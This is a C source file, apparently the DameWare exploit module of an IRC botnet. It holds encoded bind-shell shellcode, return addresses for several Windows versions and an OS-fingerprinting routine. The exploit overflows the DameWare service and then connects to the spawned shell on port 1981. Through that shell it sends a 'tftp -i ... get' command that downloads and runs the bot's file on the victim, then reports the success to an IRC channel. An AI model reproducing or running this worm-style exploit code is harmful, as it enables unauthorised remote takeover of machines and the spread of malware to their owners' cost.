#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_DAMEWARE

unsigned char send_buff[40] = {
	0x30, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC3, 0xF5, 0x28, 0x5C, 0x8F, 0xC2, 0x0D, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 
};

// works hidden cmd.exe
char phatty_rshell[] = //bind port 1981
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF" 
	"\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
	"\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
	"\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
	"\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
	"\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
	"\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
	"\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
	"\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
	"\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66"
	"\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3"
	"\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66"
	"\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B"
	"\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99"
	"\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5"
	"\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71"
	"\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32"
	"\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6"
	"\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9"
	"\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA"
	"\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8"
	"\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC"
	"\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8"
	"\xFA\xFA\xFC\xE9\xED\x99";

// I'm not gonna touch that struct, I'd rather die a slow and painful death - Ago :)
TARGET_OS target_os[]={
 
	{"UNKNOWN",{{0,""},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}}}, 
	{"WIN 2000",{{0x750362c3,"ws2_32.dll" },{0x75035173,"ws2_32.dll"},{0x717564B8,"comctl32.dll"},{0x717564B8,"comctl32.dll"},{0x717564B8,"comctl32.dll"},{0,""},{0,""}}}, //sp3 OK 0x77dc6d03, sp4 OK 0x7c2ec68b
	{"WIN XP",{{0x71ab7bfb,"ws2_32.dll"},{0x773AD507,"advapi32.dll"},{0,""},{0,""},{0,""},{0,""},{0,""}}}, //2 sp on winxp ,0x77e2d9d3, 0x773E19C3 chez moi (xp sp1 us)
	{"WIN 2003",{{0x77db565c,"advapi32.dll"},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}}}, //SP 0?? 
	{"WIN NT4",{{0x77777777,"unknown.dll"},{0x77777776,"unknown.dll"},{0x77777775,"unknown.dll"},{0x77f326c6,"kernel32.dll"},{0x77777773,"unknown.dll"},{0x77777772,"unknown.dll"},{0x77f9d463,"kernel32.dll"}}} // only SP3 + SP 6 r filled in
}; 


BOOL DameWare(EXINFO exinfo)
{
	char buffer[IRCLINE], szRecvBuf[5096], szReqBuf[5096]; 
	
	int os_sp=0, os_ver=check_os((char*)exinfo.ip,exinfo.port,&os_sp);
	BOOL bRet = FALSE;

	WSADATA WSAData;
 	if (fWSAStartup(MAKEWORD(1,1), &WSAData)!=0) 
		return FALSE; 

	// Build a buffer with the shellcode
	memcpy(szReqBuf,"\x10\x27",2);  
	memset(szReqBuf+0xc4+9,0x90,500); 

	*(unsigned long*)&szReqBuf[516] = target_os[os_ver].sp[os_sp].eip;
	
	memcpy(szReqBuf+520,				phatty_rshell,			strlen(phatty_rshell)	);
	memcpy(szReqBuf+1042,				"neTmaNiac",			9						);
	memcpy(szReqBuf+0x5b4+0x24,			"netmaniac was here",	18						);
	memcpy(szReqBuf+0x5b4+0x128,		"12/12/04 13:13:13",	17						);
	memcpy(szReqBuf+0x5b4+0x538,		"netninjaz_place",		15						);
	memcpy(szReqBuf+0x5b4+0x5b4+0x88,	"131.131.131.131",		16						);
	memcpy(szReqBuf+0x5b4+0x5b4+0x394,	"3.72.0.0",				strlen("3.72.0.0")		);

	// Connect to the server
	SOCKET sSock;
	if((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
		ssin.sin_port = fhtons((unsigned short)exinfo.port);

		if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			//_snprintf(buffer, sizeof(buffer), "[%s]: Connected to %s\r\n", exploit[exinfo.exploit].name, GetIP(sSock));
			//irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

			TIMEVAL timeout;
			timeout.tv_sec = 5;
			timeout.tv_usec = 0;
			fd_set fd;
			FD_ZERO(&fd);
			FD_SET(sSock, &fd);

			if (fselect(0, &fd, NULL, NULL, &timeout) > 0) {
				memset(szRecvBuf, 0, sizeof(szRecvBuf));
				if (frecv(sSock,(char *)szRecvBuf,sizeof(szRecvBuf),0) > 0) {
					memset(szRecvBuf,0,sizeof(szRecvBuf)); 
					
					Sleep(500);
					if (fsend(sSock,(char *)send_buff,strlen((char *)send_buff),0) > 0) {
						irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

						Sleep(2000);
						if (frecv(sSock,(char *)szRecvBuf, sizeof(szRecvBuf),0) > 0) {
							irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

							Sleep(500);
							if(fsend(sSock,(char *)szReqBuf,strlen((char *)szReqBuf),0) > 0) {
								Sleep(10000); 
								fclosesocket(sSock);

								memset(&ssin, 0, sizeof(ssin));
								ssin.sin_family = AF_INET;
								ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
								ssin.sin_port = fhtons((unsigned short)1981);

								if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {	
									char cmd_buff[400];

									_snprintf(cmd_buff,sizeof(cmd_buff),
										"tftp -i %s get %s\n"
										"%s\n",
										GetIP(exinfo.sock),filename, filename);
									if(frecv(exinfo.sock, szRecvBuf, sizeof(szRecvBuf), 0) > 0) {
										Sleep(500);

										if(fsend(sSock,(char*)cmd_buff, strlen(cmd_buff),0) > 0) {
											fclosesocket(sSock);

											_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
											if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
											addlog(buffer);
											bRet = TRUE;
										}
									}
								}
							}
						}
					}
				}
			}
		}
		fclosesocket(sSock);
	}

	return (bRet);
}

int check_os(char *host,unsigned short target_port, int *sp) 
{	
	SOCKET sSock;
	if ((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_addr.s_addr = finet_addr(host);
		ssin.sin_port = fhtons((unsigned short)target_port);

		if (fconnect(sSock,(LPSOCKADDR)&ssin,sizeof(ssin)) != SOCKET_ERROR) {
			char recv_buff[5000];
			memset(recv_buff,0,sizeof(recv_buff));

			TIMEVAL timeout;
			timeout.tv_sec = 5;
			timeout.tv_usec = 0;
			fd_set fd;
			FD_ZERO(&fd);
			FD_SET(sSock, &fd);

			if (fselect(0, &fd, NULL, NULL, &timeout) > 0) {
				if (frecv(sSock,recv_buff,sizeof(recv_buff),0) > 0) { 
					if (fsend(sSock,(const char *)send_buff,strlen((const char*)send_buff),0) > 0) {
						if (frecv(sSock,recv_buff,sizeof(recv_buff),0) > 0) {
							fclosesocket(sSock); 
	
							*sp=atoi(&recv_buff[37]); 
	
							if (recv_buff[8] == 5 && recv_buff[12] == 0)
								return ID_WIN2K;
							else if	(recv_buff[8] == 5 && recv_buff[12] == 1)
								return ID_WINXP;
							else if	(recv_buff[8] == 5 && recv_buff[12] == 2)	
								return ID_WIN2K3;
							else if	(recv_buff[8] == 4)
								return ID_WINNT;
							else
								return ID_UNKNOWN;
						}
					}
				}
			}
		}
		fclosesocket(sSock);
	}
	
	return 1;
}

#endif

